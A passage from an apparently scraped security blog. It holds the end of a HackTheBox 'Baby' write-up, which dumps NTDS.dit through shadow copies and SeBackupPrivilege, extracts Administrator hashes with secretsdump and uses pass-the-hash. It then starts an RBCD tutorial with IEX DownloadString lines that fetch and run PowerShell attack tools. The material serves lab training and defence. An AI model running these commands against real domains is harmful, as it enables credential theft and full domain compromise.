xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>\u003Cstrong>What this script does:\u003C/strong>\u003C/p>\u003Cul>\n\u003Cli>Creates a shadow copy (snapshot) of the \u003Ccode>C:\u003C/code> drive\u003C/li>\n\u003Cli>Exposes it as \u003Ccode>E:\u003C/code> drive temporarily\u003C/li>\n\u003Cli>Uses backup context to bypass file locks\u003C/li>\n\u003C/ul>\u003Cp>Then upload it to the \u003Ccode>DC\u003C/code> \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"csharp\" class=\"wrap\" style=\"--ecMaxLine:94ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">upload script.txt\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Info\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">: Uploading \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">home\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">delorian\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">HackTheBox\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Medium\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Baby\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">content\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">script.txt to \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">C\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">:\\Temp\\script.txt\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Data\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">232\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> bytes of \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">232\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> bytes copied\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Info\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">: Upload successful\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>\u003Cstrong>Why this works with \u003Ccode>SeBackupPrivilege\u003C/code>:\u003C/strong>\u003C/p>\u003Cul>\n\u003Cli>Shadow copies allow reading locked files\u003C/li>\n\u003Cli>Backup flag in \u003Ccode>robocopy\u003C/code> uses \u003Ccode>SeBackupPrivilege\u003C/code> to bypass \u003Ccode>ACLs\u003C/code>\u003C/li>\n\u003Cli>We get a clean copy of \u003Ccode>NTDS.dit\u003C/code> without stopping AD service\u003C/li>\n\u003C/ul>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:24ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">diskshadow \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">s script.txt\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Then let’s use \u003Ccode>robocopy\u003C/code> to copy the file into our \u003Ccode>C:\\Temp\u003C/code> folder\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:38ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">robocopy\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">/b\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">E:\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\W\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">indows\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">tds\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">.\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ntds.dit\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>And there we have our three files that we will use to dump hashes!!:\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:61ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">*Evil-WinRM* PS C:\\Temp> dir\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:4ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Directory: C:\\Temp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Mode                 LastWriteTime         Length Name\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">----                 -------------         ------ ----\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">-a----        10/24/2025   8:20 AM       16777216 ntds.dit\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">-a----        10/24/2025   9:01 AM          49152 sam.hive\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">-a----        10/24/2025   9:05 AM            175 script.txt\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">-a----        10/24/2025   9:01 AM       20684800 system.hive\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch2 id=\"dumping-hashes\">Dumping hashes\u003Ca class=\"anchor\" href=\"#dumping-hashes\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>Let’s download the three files onto the attacker machine using \u003Ccode>evil-winrm's\u003C/code> \u003Cem>download\u003C/em> so we can use \u003Ccode>impacket-secretsdump\u003C/code> and dump all the \u003Cem>hashes\u003C/em> \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:102ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL | grep Administrator\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:x:::\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Administrator:des-cbc-md5:d38cb994ae806b97\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We know the second one it’s the correct domain \u003Cem>Administrator\u003C/em> user so we will use the hash and \u003Ccode>PtH\u003C/code> using \u003Ccode>evil-winrm\u003C/code> to the \u003Cem>DC\u003C/em>, this time with the \u003Cem>Administrator\u003C/em> user\u003C/p>\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F421uXpT20xsG0ZCvntXv%2Fimage.png?alt=media&#x26;token=f3048525-232b-4947-b969-3072a6608df7\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\u003Csection>\u003Ch3 id=\"conclusion\">Conclusion\u003Ca class=\"anchor\" href=\"#conclusion\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>This attack chain demonstrates a classic Active Directory privilege escalation:\u003C/p>\u003Col>\n\u003Cli>\u003Cstrong>Initial Access\u003C/strong>: Password spray → Password reset → \u003Ccode>WinRM\u003C/code> access\u003C/li>\n\u003Cli>\u003Cstrong>Privilege Discovery\u003C/strong>: Backup Operators group membership with \u003Ccode>SeBackupPrivilege\u003C/code>\u003C/li>\n\u003Cli>\u003Cstrong>Credential Extraction\u003C/strong>: Shadow copy technique to dump \u003Ccode>NTDS.dit\u003C/code>\u003C/li>\n\u003Cli>\u003Cstrong>Domain Compromise\u003C/strong>: Extract domain Administrator’s \u003Cem>hash\u003C/em> for full domain control\u003C/li>\n\u003C/ol>\u003Cp>The takeaway is that \u003Cstrong>Backup Operators\u003C/strong> group membership is highly dangerous in \u003Cem>Active Directory environments\u003C/em>, as it allows attackers to extract the entire domain credential database through volume shadow copies, ultimately leading to complete domain compromise.\u003C/p>\u003C/section>\u003C/section>\u003C/section>",{"headings":291,"localImagePaths":312,"remoteImagePaths":313,"frontmatter":314,"imagePaths":320},[292,294,297,300,303,306,309],{"depth":22,"slug":275,"text":293},"Baby#",{"depth":58,"slug":295,"text":296},"reconnaissance","Reconnaissance#",{"depth":58,"slug":298,"text":299},"password-spraying","Password Spraying#",{"depth":58,"slug":301,"text":302},"foothold","Foothold#",{"depth":58,"slug":304,"text":305},"abusing-sebackupprivilege","Abusing SeBackupPrivilege#",{"depth":58,"slug":307,"text":308},"dumping-hashes","Dumping hashes#",{"depth":123,"slug":310,"text":311},"conclusion","Conclusion#",[],[],{"title":278,"published":315,"description":280,"image":281,"tags":316,"category":46,"draft":39,"minutes":317,"words":318,"excerpt":319},["Date","2025-10-24T00:00:00.000Z"],[43,283,284],7,1370,"As always, we start off by performing our regular TCP scan using nmap  ",[],"baby.md","rbcd",{"id":322,"data":324,"body":332,"filePath":333,"digest":334,"rendered":335,"legacyId":412},{"title":325,"published":326,"draft":39,"description":327,"image":328,"tags":329,"category":330,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"Resource-Based Constrained Delegation (RBCD)",["Date","2025-07-25T00:00:00.000Z"],"In this Post you'll learn everything you need to know about Resource-Based Constrained Delegation, from exploitation on Linux/Windows to how to Prevent it.","https://delorian.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F3550432212-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FgxTXO9Ixrx4ExK6jnMbc%252Fuploads%252FeNH7fh8aux3nJ75dkpDO%252Fimage.png%3Falt%3Dmedia%26token%3D9cd24f3b-0dd9-4376-a7b5-8dca7cfdeef6&width=768&dpr=1&quality=100&sign=da31eab4&sv=2",[330,331,43],"Blog","Attack","# Resource-Based Constrained Delegation\n\n*In many different environments, our Pentest team finds the same common active directory related vulnerabilities over and over again. Those can often be exploited for privilege escalation and or lateral movement. This blog post presents one of these well-known publicly documented attack techniques – namely **Resource Based Constrained Delegation (RBCD)***.\n## 1. How Does it work?\n### 1.1 **Understanding AD Delegation**\n\nIn **Active Directory**, delegation allows **impersonating other user accounts** on target computers after delegation permissions are granted. There are **three main types** of delegation:\n\n1. **Unconstrained Delegation**\n2. **Constrained Delegation**\n3. **Resource-Based Constrained Delegation (RBCD)**\n\nThis explanation focuses on **RBCD attacks**.\n\n### 1.2 **Constrained vs Resource-Based Delegation**\n\n#### **Constrained Delegation:**\n\n* Uses the **`msDS-AllowedToDelegateTo`** attribute\n* Configured on the **source** object (the one being granted rights)\n* Allows impersonation for **specific services**\n\n### 1.3 Example: Checking constrained delegation\n\n```powershell\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth\n```\n\n#### **Resource-Based Constrained Delegation (RBCD):**\n\n* Uses the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute\n* Configured on the **target** object (the resource being accessed)\n* **Computer-to-computer** delegation only\n\nIf you want to learn more about the attack, [Microsoft offers some documentation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) about it\n\n## 2. Scenario\n\nIn order to explain this attack, we will use the [Support](https://www.hackthebox.com/machines/support\n) machine of ***HackTheBox***\n\n\n\n\n### 2.1 Enumerating\n\nThe easiest way to enumerate RBCD misconfigurations is using **BloodHound**. Mark your current user as owned and perform the **\"Shortest Paths from Owned Principles\"** query.\n\n::github{repo=\"SpecterOps/BloodHound\"}\n\n\n\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fyxfqm0qieV9xXw47hJxw%2Fimage.png?alt=media&#x26;token=8da120cd-982c-4fa1-8678-1e83d664bb9e\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\n\n\n\nIn a *Resource-Based Constrained Delegation* scenario we will see that a user or group has *GenericAll / GenericWrite / Owns / WriteDacl* **ACL** over a computer\n\nAny of these permissions can be developed onto the *Resource-Based Constrained Delegation* like in this case the group `SHARED SUPPORT ACCOUNTS` has *GenericAll* over the computer `DC.SUPPORT.HTB`\n\n## 3. Exploitation from Windows\n\n\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FmNQTTBwJsZuiLZ1u8cIR%2Fimage.png?alt=media&#x26;token=5f6cbf6c-2533-4d02-bcc9-61901f101b17\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\n\nFirst we will need to download and import `PowerMad.ps1`\n\n#### 3.1 Downloading toolset\n\n> **PowerMad** is a **PowerShell toolkit** for Active Directory that enables **machine account creation and DNS record manipulation** using standard domain user privileges for `RBCD` attacks.\n\n::github{repo=\"Kevin-Robertson/Powermad\"}\n\n```powershell\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')\nImport-Module Powermad.ps1\n```\n\nAnd `PowerView.ps1`\n\n> **PowerView** is a **PowerShell reconnaissance tool** for Active Directory that enables **permission enumeration, object querying, and attack path discovery** through extensive AD property and ACL analysis.\n\n::github{repo=\"PowerShellMafia/PowerSploit\"}\n\n```powershell\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')\nImport-Module PowerView.ps1\n```\n\n#### 3.2 Creating the Machine Account\n\nThen create a fake machine account called **FAKE** with the following password: `Password123!` , make sure to not forget this password as you will need it in further exploitation\n\n```powershell\nNew-MachineAccount -MachineAccount 'FAKE' -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose\n```\n\nTo check if the new machine account was successfully created, let's try to check it using **PowerView**\n\n```powershell\nGet-DomainComputer FAKE\n```\n\n#### 3.3 Configuring RBCD\n\n> Note: this part is done using powerview\n\nAfter that, we need to get the *SID* of the fake computer we just 